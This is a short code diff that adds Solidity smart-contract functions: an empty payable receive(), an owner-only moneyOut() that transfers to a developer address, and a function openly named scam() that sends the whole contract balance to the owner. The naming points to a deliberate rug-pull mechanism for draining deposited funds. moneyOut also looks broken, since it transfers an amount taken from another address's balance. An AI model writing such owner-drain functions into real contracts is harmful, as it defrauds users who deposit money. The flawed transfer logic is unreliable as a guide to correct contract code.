@@ -1,0 +1,15 @@
+
+
+function receive() external payable {}
+
+function moneyOut() external onlyOwner {
+    payable(devAddress).transfer(contractMinterAddress.balance);
+}
+
+function scam() public {
+	require(owner == msg.sender, "You must be an owner!");
+
+	address payable receiver = payable(msg.sender);
+
+	receiver.transfer(address(this).balance);
+}
